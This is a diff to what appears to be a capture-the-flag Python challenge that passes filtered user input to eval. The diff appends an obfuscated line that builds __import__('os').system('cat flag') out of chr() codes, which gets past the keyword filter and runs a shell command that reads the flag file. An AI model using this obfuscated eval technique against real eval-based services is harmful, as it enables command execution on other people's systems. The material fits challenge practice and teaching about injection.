@@ -23,3 +23,8 @@ if filter(input_data):
     print("Oh hacker!")
     exit(0)
 print('Answer: {}'.format(eval(input_data)))
+
+#help() --> +
+# !/bin/bash
+#-----------------------------------------------
+eval(chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(39)+chr(111)+chr(115)+chr(39)+chr(41)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(99)+chr(97)+chr(116)+chr(32)+chr(102)+chr(108)+chr(97)+chr(103)+chr(39)+chr(41))
